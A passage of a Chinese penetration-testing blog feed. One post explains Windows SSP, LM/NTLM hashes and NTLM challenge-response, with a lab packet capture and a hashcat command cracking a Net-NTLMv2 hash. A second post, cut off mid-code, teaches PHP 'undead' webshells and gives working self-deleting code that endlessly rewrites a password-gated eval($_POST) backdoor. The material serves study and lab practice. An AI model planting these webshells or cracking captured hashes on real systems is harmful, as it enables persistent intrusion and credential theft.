SSP 与远程的服务进行了身份验证后，此 SSP 都会为本次连接生成一个随机 key。这个 key 往往被称为 Session Key。上层应用在经过身份验证后，可以选择性地使用这个 Key 对之后发往服务端或接收自服务端的数据进行签名或加密。</p><blockquote><p><strong>就打比方来说kerberos协议里面就有一个session key  ，这么来理解就是利用了SSP与远程服务进行身份验证后就会生成一个key值，这个key就可以对服务端或者接受服务端的数据都可以进行签名或加密。而kerberos里面的就是利用了hash值来对session key进行加密</strong></p></blockquote><p>在系统层面，SSP就是一个dll（window里面动态链接库，linux是.so），来实现身份验证等安全功能，实现的身份验证机制是不一样的。比如 NTLM SSP 实现的就是一种 Challenge/Response 验证（挑战/应答）机制。而 Kerberos 实现的就是基于 ticket 的身份验证机制。我们可以编写自己的 SSP，然后注册到操作系统中，让操作系统支持更多的自定义的身份验证方法。</p><p>那么既然我们可以自己创建一个ssp，注册到操作系统中，那么就能想到权限的维持，或者说是后门：<strong>Security Support Provider</strong></p><p>这就是windows定义的的一套接口  </p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/402d2ba6f20ae11de236969a5e8dde36.gif" alt="img"></p><p>RPC:远程过程调用(RPC)是一种通过网络从远程计算机程序上请求服务,而不需要了解底层网络技术的协议</p><h2 id="windows的认证方式"><a href="#windows的认证方式" class="headerlink" title="windows的认证方式"></a>windows的认证方式</h2><p>学习之前，不去研究下面的，先来回顾一下什么是认证？</p><p>顾名思义就是去证明你自己，拿个简单的例子就是一个服务器，当它存在401认证的时候，你的要有权限去访问，你虽然是管理员，但是你没有去证明自己是真的管理员，那么我们又如何去证明？</p><p>因为存在着401认证，而我们的账号密码都存放在了数据库里面，当我们输入账号密码进去的时候，就会去数据库里面寻找是否有该账号和密码，如果存在那么成功登录，不存在，登录就失败。这就是最简单的windows的basic认证，简单暴力直接，但是安全问题就比较大了。</p><p>这时候呢就存在了一个加密的传输，就举个简单的例子，在我们不知道密码的情况下，是如何判断身份的呢，或者说是间接的知道了密码：就你跟你的好朋友一起，同时旁边还有第三者，你跟你朋友之间谈话是明文，第三者确实能听懂，但是不用说出密码你们两个就能判别互相的身份，关键第三者不知道你们两之间的密码。而两者之间如何身份相互认证之后，那么他们之间的会话传递就是加密的。</p><p>而windows里面最常见的就是kerberos协议和NTLM协议，附上大佬的图，基本的认证方式</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211014164343148.png" alt="image-20211014164343148"></p><h3 id="windows的本地认证"><a href="#windows的本地认证" class="headerlink" title="windows的本地认证"></a>windows的本地认证</h3><p>简单了解完了windows的认证方式，再来看看windows的本地认证。</p><p>本地认证的密码都存储在%SystemRoot%\System32\config\SAM里面。当用户输入密码的时候，就会将输入的密码进行NTLM hash加密，然后在sam里面找有没有相匹配的。当用户注销，重启，锁屏之后，就会到登录界面，而winlogon接收到用户的输入后，就会把密码交给lsass进程，这个进程会存一份明文密码，然后再将明文密码加密成NTLM hash，跟sam里面的比对</p><p>(winlogon.exe即Windows Logon Process，是Windows NT用户登陆程序，用于管理用户登录和退出。lsass进程用于微软Windows系统的安全机制。它用于本地安全和登陆策略。)</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211014165131825.png" alt="image-20211014165131825"></p><h4 id="LM-Hash-amp-NTLM-Hash"><a href="#LM-Hash-amp-NTLM-Hash" class="headerlink" title="LM Hash &amp; NTLM Hash"></a>LM Hash &amp; NTLM Hash</h4><p>在wwindows内部中，并不是直接保存明文密码，而是保存hash的</p><p>本机密码保存地：%SystemRoot%\System32\config\SAM</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211014113151714.png" alt="image-20211014113151714"></p><p>域用户密码保存地：%SystemRoot%/NTDS/ntds.dit</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211014113230305.png" alt="image-20211014113230305"></p><p>%SystemRoot%的理解</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211014113256436.png" alt="image-20211014113256436"></p><p>而一般windows里面导出来的hash是这样的</p><pre><code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:afffeba176210fad4628f0524bfe1942:::其中前面是LM hash  后面是NT hashadministrator:500:LM hash:NTLM hash:::</code></pre><p>在windows2000以后的系统中，第一部分的 LM-hash 都是空值，因为LM-hash可以很容易的破解，所以windows2000之后这个值默认为空，所以第二部分的NTLM-hash才真正是用户密码的哈希值</p><h5 id="LM-hash"><a href="#LM-hash" class="headerlink" title="LM hash"></a><strong>LM hash</strong></h5><p>LM Hash 的全称为 LAN Manager Hash，这是 Windows 中最早用的加密算法。</p><p>LM hash的计算方式</p><pre class="line-numbers language-php"><code class="language-php"><span class="token number">1</span><span class="token punctuation">.</span>首先将密码转换成大写，然后再十六进制转换，明文口令不足<span class="token number">14</span>字节的情况下，后面添加<span class="token number">0</span>补足<span class="token number">14</span>字节（一个字节＝<span class="token number">2</span>个<span class="token number">16</span>进制字符，一个<span class="token number">16</span>进制位＝<span class="token number">0.5</span>个字节）<span class="token constant">WELCOME</span><span class="token operator">--</span>》<span class="token constant">57454C434F4D45</span> <span class="token number">00000000000000</span>  所以这里是十六进制是<span class="token number">7</span>个字节，加上后面的<span class="token number">0</span>就是<span class="token number">14</span>字节<span class="token number">2</span><span class="token punctuation">.</span>密码的<span class="token number">16</span>进制字符串被分成两个<span class="token number">7</span>字节部分。将<span class="token number">7</span>字节转换成7bit，每7bit后面添<span class="token number">0</span>补足<span class="token number">8</span>位<span class="token constant">57454C434F4D45</span> <span class="token operator">-</span><span class="token function">str_to_key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span> <span class="token constant">56A25288347A348A</span><span class="token number">00000000000000</span> <span class="token operator">-</span><span class="token function">str_to_key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span> <span class="token number">0000000000000000</span><span class="token number">3</span><span class="token punctuation">.</span>这两组<span class="token number">8</span>字节数据将做为<span class="token constant">DESKEY</span>对魔术字符串”<span class="token constant">KGS</span><span class="token operator">!</span>@<span class="token shell-comment comment">#$%”进行标准DES加密</span><span class="token string">"KGS!@#$%"</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token constant">4B47532140232425</span><span class="token constant">56A25288347A348A</span> <span class="token operator">-</span>对<span class="token constant">4B47532140232425</span>进行标准<span class="token constant">DES</span>加密<span class="token operator">-</span><span class="token operator">></span> <span class="token constant">C23413A8A1E7665F</span><span class="token number">0000000000000000</span> <span class="token operator">-</span>对<span class="token constant">4B47532140232425</span>进行标准<span class="token constant">DES</span>加密<span class="token operator">-</span><span class="token operator">></span> <span class="token constant">AAD3B435B51404EE</span><span class="token number">4</span><span class="token punctuation">.</span>最后两个拼接<span class="token constant">LM</span> Hash<span class="token punctuation">:</span> <span class="token constant">C23413A8A1E7665FAAD3B435B51404EE</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>缺点</strong></p><p>1.密码长度最大只能位14位数</p><p>2.密码不区分大小写。在生成哈希值之前，所有密码都将转换为大写</p><p>3.查看我们的加密过程，就可以看到使用的是分组的DES，如果密码强度是小于7位，那么第二个分组加密后的结果肯定是aad3b435b51404ee，如果我们看到LM hash的结尾是aad3b435b51404ee，就可以很轻易的发现密码强度少于7位</p><p>4.DES密码强度不高</p><h5 id="NTLM-hash"><a href="#NTLM-hash" class="headerlink" title="NTLM hash"></a>NTLM hash</h5><p>从Windows Vista 和 Windows Server 2008开始，默认情况下只存储 NTLM Hash，LM Hash 将不再存在</p><p>下面是各个版本对LM NTLM的支持</p><table><thead><tr><th></th><th>2000</th><th>XP</th><th>2003</th><th>Vista</th><th>Win7</th><th>2008</th><th>Win8</th><th>2012</th></tr></thead><tbody><tr><td>LM</td><td>√</td><td>√</td><td>√</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>NTLM</td><td>⭐</td><td>⭐</td><td>⭐</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td></tr></tbody></table><p>其中</p><p>√：系统默认的使用的加密方式</p><p>⭐：当密码超过14位后使用的加密方式</p><p>当我们抓取密码的时候，如果LM是空或者不储蓄LM hash的话，那么我们的hashdump抓取的 LM hash那一部分都是 下面这个</p><pre><code>AAD3B435B51404EEAAD3B435B51404EE</code></pre><p>拿一个打靶机hashdump读出来的</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211014163639393.png" alt="image-20211014163639393"></p><p>可以看到所有的LM hash密码一致</p><p>也可以</p><pre><code>可以将LM hash填0(LM hash可以为任意值)，即00000000000000000000000000000000:NT hash //注意32个0</code></pre><p>扯回NTLM hash</p><p><strong><u>NTLM hash的计算方法</u></strong></p><pre><code>1.先将用户密码转换为十六进制格式。2.将十六进制格式的密码进行Unicode编码。3.使用MD4摘要算法对Unicode编码数据进行Hash计算</code></pre><p>脚本验证</p><pre class="line-numbers language-python"><code class="language-python">python2 <span class="token operator">-</span>c <span class="token string">'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", "woshidatiancai".encode("utf-16le")).digest())'</span>  <span class="token operator">//</span>密码woshidatiancai<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211014163854409.png" alt="image-20211014163854409"></p><p>可以看到加密后的NTLM hash值</p><h3 id="NTLM的身份认证"><a href="#NTLM的身份认证" class="headerlink" title="NTLM的身份认证"></a>NTLM的身份认证</h3><p>NTLM的认证可分为本地认证和网络认证，本地认证就是windows的本地认证，而网络认证就是用于域的基础认证，或者工作组的认证</p><h4 id="NTLM协议"><a href="#NTLM协议" class="headerlink" title="NTLM协议"></a>NTLM协议</h4><p>NTLM是一种网络认证协议，它是基于挑战（Chalenge）/响应（Response）认证机制的一种认证模式。(这个协议只支持Windows)</p><p>NTLM协议的认证（也就是NTLM认证）共需要三个消息完成：协商 –&gt; 挑战 –&gt; 认证。</p><blockquote><p>type1（协商）：主要用于确认双方协议版本、加密等级等</p><p>type2（挑战）：服务器在收到客户端的协商消息之后， 会读取其中的内容，并从中选择出自己所能接受的服务内容，加密等级，安全服务等等。并生成一个随机数challenge, 然后生成challenge消息返回给客户端。该消息就是挑战/响应认证机制的主要功能体现。</p><p>type3（认证）：验证主要是在挑战完成后，验证结果，是认证的最后一步。</p></blockquote><h4 id="NTLM在工作组当中的认证方式"><a href="#NTLM在工作组当中的认证方式" class="headerlink" title="NTLM在工作组当中的认证方式"></a>NTLM在工作组当中的认证方式</h4><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211014220249473.png" alt="image-20211014220249473"></p><p>1.当用户的登录客户端后需要访问服务器的某个服务的时候就需要输入想相对应的密码，于是用户在客户端输入了服务器的账号密码之后，客户端就会去缓存一个自己输的服务器密码的NTLM-hash值，同时也会发送type1协商需要认证的主体，服务器的用户，安全服务等等。服务器那门当然是提前存储了正确的账号密码</p><p>2.服务端接受到了客户端的type1协商之后，就会去打开里面的内容，识别一些它能识别的内容：服务内容，加密等级，安全服务等。然后传入到NTLM SSP中去，就会得到type 2 challenge（challenge挑战消息），并将此type2（没有加密过的challenge）发送给客户端，里面就包含了服务器生成的challenge16位随机值</p><p>3.客户端收到服务端返回的 TYPE 2 消息后， 会读取出服务端所支持的内容，并取出其中的随机值 Challenge，用缓存登录的密码的 NTLM-Hash 对其进行加密，其实就得到了challenge2（也可以说是response），并与用户名、主机名、Challenge 等一起组合得到 <strong>Net-NTLMHash</strong>，最后将 <strong>Net NTLM-Hash</strong> 封装到 <strong>TYPE 3 Authenticate</strong> 消息中（被称为 Authenticate 认证消息），发往服务端</p><p>4.服务器在收到 TYPE 3 的消息之后，用自己之前存储的 NTLM-Hash 对 Challenge 进行加密，得到一个challenge1，并比较自己计算出的 Net  NTLM-Hash 认证消息和客户端发送的认证消息是否匹配（也就是challenge1比较response）。如果匹配，则证明客户端掌握了正确的密码，认证成功，否则认证失败。</p><p>总的来说就是：当客户端输入用户名和密码之后，就会缓存自己输入密码的NTLM hash，并发送type1 ，服务器收到并打开，传入NTLM SSP中去，就会得到服务器随机生成的16位，发送给客户端的同时也保存。客户端接受并取出随机值，再用缓存的NTLM hash进行加密得到net-NTLMhash，再发送给服务器，最后就是服务收到后用自己的密码的NTLM hash对保存的challenge加密在进行比较</p><p>所以就是客户端输入的缓存密码NTLM hash加密challenge  对比  服务器的自己正确的密码的NTLM hash对自己本身生成的保存的challenge </p><h4 id="抓包查看"><a href="#抓包查看" class="headerlink" title="抓包查看"></a>抓包查看</h4><p>实验靶机 win7   2008</p><p>win7 : 192.168.1.129</p><p>2008: 192.168.1.131</p><p>前提可以ipc连接</p><p>通过抓包来看看具体的历程</p><p>认证失败的</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211014233938924.png" alt="image-20211014233938924"></p><p>通过抓包</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211014234000457.png" alt="image-20211014234000457"></p><p>四个数据包对应NTLM认证的四个步骤，查看第二个数据包</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211014234103218.png" alt="image-20211014234103218"></p><p>可以看到challenge，再看第三个数据包</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211014235107219.png" alt="image-20211014235107219"></p><p>可以看到第三个数据包就有response了</p><p>再来看看认证成功的</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211015102615653.png" alt="image-20211015102615653"></p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211014234704224.png" alt="image-20211014234704224"></p><p>同样看看第二个数据包可以看到challenge</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211014234731583.png" alt="image-20211014234731583"></p><p>再来看看第三个</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211014235043263.png" alt="image-20211014235043263"></p><p>我们可以看到一个NTLMv2的格式</p><p>其实NTLM 有3个版本  分为NTLM v1，NTLMv2，NTLM session v2</p><p>不同协议使用不同格式的Challenge和加密算法</p><p>所以也就存在不同协议的Net-NTLM hash，即Net-NTLM v1 hash，Net-NTLM v2 hash  而上面抓的包中response里面就是Net-NTLM hash</p><h4 id="NTLMv1和NTLMv2的区别"><a href="#NTLMv1和NTLMv2的区别" class="headerlink" title="NTLMv1和NTLMv2的区别"></a>NTLMv1和NTLMv2的区别</h4><p>不同的是challenge和加密算法，但是相同的是都是用了NTLM hash</p><p>v1的challenge：8字节    算法：DES</p><p>v2的challenge：16字节   算法：HMAC-MD5</p><p>NTLMv1的格式</p><pre><code>username::hostname:LM response:NTLM response:challenge</code></pre><p>NTLMv2的格式</p><pre><code>username::domain:challenge:HMAC-MD5:blob</code></pre><p>这里主要看NTLMv2</p><p>username：就是要访问的服务器名</p><p>domain：访问的主机名或者ip</p><p>challenge：数据包中2所返回的challenge</p><p>HMAC-MD5：对应数据包3中的NTProofStr</p><p>blob：对应数据包中Response去掉NTProofStr的那一部分</p><p>比如：</p><p>f6ef4594fbb2c9387335b27e592c5f1f01010000000000002d38cda912c1d701042c7990deeb4736000000000200060047004f004400010006004f005700410004000e0067006f0064002e006f0072006700030016006f00770061002e0067006f0064002e006f007200670005000e0067006f0064002e006f0072006700070008002d38cda912c1d701060004000200000008003000300000000000000000000000003000009f57401aa3d5a32acac00d0ce543bd9d606d0156b648aede2f1378737b9e1cd90a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e0031002e00310033003100000000000000000000000000</p><p>而NTProofStr是f6ef4594fbb2c9387335b27e592c5f1f</p><p>那么就去掉response中前面的NTProofStr</p><p>最后就是</p><p>01010000000000002d38cda912c1d701042c7990deeb4736000000000200060047004f004400010006004f005700410004000e0067006f0064002e006f0072006700030016006f00770061002e0067006f0064002e006f007200670005000e0067006f0064002e006f0072006700070008002d38cda912c1d701060004000200000008003000300000000000000000000000003000009f57401aa3d5a32acac00d0ce543bd9d606d0156b648aede2f1378737b9e1cd90a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e0031002e00310033003100000000000000000000000000</p><p>总：</p><pre><code>administrator::192.168.1.131:ed71177f930bd7ad:f6ef4594fbb2c9387335b27e592c5f1f:01010000000000002d38cda912c1d701042c7990deeb4736000000000200060047004f004400010006004f005700410004000e0067006f0064002e006f0072006700030016006f00770061002e0067006f0064002e006f007200670005000e0067006f0064002e006f0072006700070008002d38cda912c1d701060004000200000008003000300000000000000000000000003000009f57401aa3d5a32acac00d0ce543bd9d606d0156b648aede2f1378737b9e1cd90a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e0031002e00310033003100000000000000000000000000</code></pre><p>有了NET-NTLM hash之后我们就可以进行爆破了</p><pre><code>hashcat -m 5600 administrator::GOD:ed71177f930bd7ad:f6ef4594fbb2c9387335b27e592c5f1f:01010000000000002d38cda912c1d701042c7990deeb4736000000000200060047004f004400010006004f005700410004000e0067006f0064002e006f0072006700030016006f00770061002e0067006f0064002e006f007200670005000e0067006f0064002e006f0072006700070008002d38cda912c1d701060004000200000008003000300000000000000000000000003000009f57401aa3d5a32acac00d0ce543bd9d606d0156b648aede2f1378737b9e1cd90a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e0031002e00310033003100000000000000000000000000 3.txt --force</code></pre><p>-m： hash-type，5600对应NetNTLMv2，详细参数可查表：<a href="https://hashcat.net/wiki/doku.php" target="_blank" rel="noopener">https://hashcat.net/wiki/doku.php</a></p><p>3000是LM hash  NTLM hash是1000</p><p>–force代表强制执行，测试系统不支持Intel OpenCL</p><p>如果想输出文件可以 -o </p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211015133309702.png" alt="image-20211015133309702"></p><p>可以看到密码已经爆破出来。</p><h4 id="NTLM在域环境中的认证"><a href="#NTLM在域环境中的认证" class="headerlink" title="NTLM在域环境中的认证"></a>NTLM在域环境中的认证</h4><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211015143559447.png" alt="image-20211015143559447"></p><p>前面3个步骤跟NTLM 在工作组的认证一样，主要是4，5，6</p><p>4.服务器收到了客户端发送的type3认证消息后，取出其中的Net NTLM-hash的值，并通过Netlogon协议向DC域控发送针对客户端的验证请求。该请求主要包含以下三方面的内容：客户端用户名、原始的Challenge 和 加密后的Challenge(也就是Net NTLM-Hash）</p><p>5.然后DC就会拿出自己的存储的NTLM hash对challenge加密得到Net NTLM-hash，并且跟服务器所发的进行对比，，如果一致，则用户拥有正确的密码，验证通过，否则验证失败。并将验证结果发给服务器。</p><p>6.然后服务器根据DC发送的结果，并给客户端回答</p><h3 id="相关的安全问题"><a href="#相关的安全问题" class="headerlink" title="相关的安全问题"></a>相关的安全问题</h3><p>1.哈希传递攻击（PTH）</p><p>2.利用ntlm进行的信息收集</p><p>在相应type2中，我们可以看看抓的包</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211015151808281.png" alt="image-20211015151808281"></p><p>同时返回了操作系统类型，主机名，netbios名等等。这也就意味着如果我们在能跟服务器进行ntlm 交流中，给服务器发送一个type1的请求，服务器返回type2的响应，这一步，我们就可以得到很多信息</p><p>通过工具smb_version,或者msf中的模块auxiliary/scanner/smb/smb_version</p><p>3.NTLM Relay</p><p>参考链接：</p><p><a href="https://www.anquanke.com/post/id/193149?from=timeline#h2-1" target="_blank" rel="noopener">https://www.anquanke.com/post/id/193149?from=timeline#h2-1</a></p><p><a href="https://xie1997.blog.csdn.net/article/details/85941222" target="_blank" rel="noopener">https://xie1997.blog.csdn.net/article/details/85941222</a></p><p><a href="https://3gstudent.github.io/Windows下的密码hash-NTLM-hash和Net-NTLM-hash介绍" target="_blank" rel="noopener">https://3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D</a></p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>不死马php</title>
      <link href="/posts/41ff.html"/>
      <url>/posts/41ff.html</url>
      
        <content type="html"><![CDATA[<h1 id="不死php-webshell"><a href="#不死php-webshell" class="headerlink" title="不死php webshell"></a>不死php webshell</h1><h2 id="什么是不死马"><a href="#什么是不死马" class="headerlink" title="什么是不死马"></a>什么是不死马</h2><p>何为不死马，简而言之杀不死的🐎，就是运行一段不会退出进程（注入php进程里面的，也称PHP的内存马）的木马，并且是无限执行的。主要作用就是去维持权限。</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/%E9%A9%AC%E9%BA%A6%E7%9A%AE.jpg" alt="马麦皮"></p><p>在实战当中，虽然很少去利用，但是有的时候也可以<strong>有效的去用来做一些防护的绕过</strong>。也加大了一些<strong>溯源的难度，和宿主检测webshell的难度</strong></p><h2 id="生成的过程"><a href="#生成的过程" class="headerlink" title="生成的过程"></a>生成的过程</h2><p>1.首先创建一个不死马.php</p><p>2.上传服务器</p><p>3.执行不死马</p><p>4.服务器无限生成</p><h2 id="例一"><a href="#例一" class="headerlink" title="例一"></a>例一</h2><p>先来看一个简单的例子</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"ash.php"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//打开一个文件</span><span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token string">"&lt;?php phpinfo();?>\n"</span><span class="token punctuation">;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//写入一个文件</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当我们去访问，就就会在本地生成一个ash.php</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211012231423263.png" alt="image-20211012231423263"></p><p>缺点就是每次去访问才会生成,  看别人写的循环，我访问了直接卡死了</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">do</span> <span class="token punctuation">{</span>  <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">'test.php'</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"xxx"</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"test.php"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token string">"&lt;?php phpinfo();?>\n"</span><span class="token punctuation">;</span>  <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="例二"><a href="#例二" class="headerlink" title="例二"></a>例二</h2><p>上面例一只是一个小例子，再来看看一个经典的不死马</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">ignore_user_abort</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string">' ash.php'</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//文件名为ash.php</span>    <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string">'&lt;?php if(md5($_GET["ash"])=="e10adc3949ba59abbe56e057f20f883e"){@eval($_POST["ash"]);}?>'</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//123456</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">usleep</span><span class="token punctuation">(</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>来看第一个 </p><p>ignore_user_abort(true);  //设置与远程客户端断开后是否继续执行脚本，true即不断开，意思就是即使与客户端断开（不打开浏览器）也可以执行脚本的</p><p>set_time_limit(0) // 函数设置脚本最大执行时间。这里设置为 0，即没有时间方面的限制。</p><p>@unlink(<strong>FILE</strong>);  //删除文件本身 ,做到隐藏的功能，也就是无文件落地实现</p><p>file_get_contents($file,$code);  //打开$file文件，然后写入$code </p><p>usleep(5000);  //每隔usleep(5000)写入一个新文件</p><p>还可以变形成这样（大佬的文章写的这个方法，感觉挺好用的，就搬过来）</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>  <span class="token function">ignore_user_abort</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//关掉浏览器，PHP脚本也可以继续执行.</span>  <span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//通过set_time_limit(0)可以让程序无限制的执行下去</span>  <span class="token variable">$interval</span> <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 每隔*秒运行</span><span class="token keyword">do</span> <span class="token punctuation">{</span>  <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">'test.php'</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"xxx"</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"test.php"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token string">"&lt;?php phpinfo();?>\n"</span><span class="token punctuation">;</span>  <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token variable">$interval</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" 